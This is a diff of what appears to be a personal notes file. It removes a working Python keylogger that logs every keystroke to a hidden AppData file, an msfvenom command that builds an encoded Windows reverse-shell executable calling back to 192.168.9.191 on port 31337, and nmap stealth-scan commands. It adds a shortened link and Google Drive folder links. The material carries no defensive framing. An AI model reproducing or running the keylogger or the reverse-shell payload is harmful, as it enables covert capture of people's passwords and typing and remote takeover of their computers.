@@ -1,23 +1,6 @@
-import logging
-from pynput.keyboard import Key, Listener
-# Setting the log directory
-log_dir = "C:/Users/admin/AppData/Local/Programs/Python/Python311/key_log.txt"
-# Basic logging configuration
-logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG,
-format='%(asctime)s: %(message)s')
-# Function to handle key press event
-def on_press(key):
-logging.info(str(key))
-# Starting the listener
-with Listener(on_press=on_press) as listener:
-listener.join()
+shorturl.at/lnwxS
 
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.9.191 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+https://drive.google.com/drive/folders/1--qQ-_mBGWN-p_CE-G-a9sSbWIuCjSK-
 
 https://drive.google.com/drive/folders/1BsR1kBHcosdZH0Do8fJgFwMPCxrBej1-
 
-nmap -sA -T4 scanme.nmap.org
-nmap -p22,113,139 scanme.nmap.org
-nmap -sF -T4 para 
-nmap –sN –p 22 scanme.nmap.org
-nmap -sX -T4 scanme.nmap.org
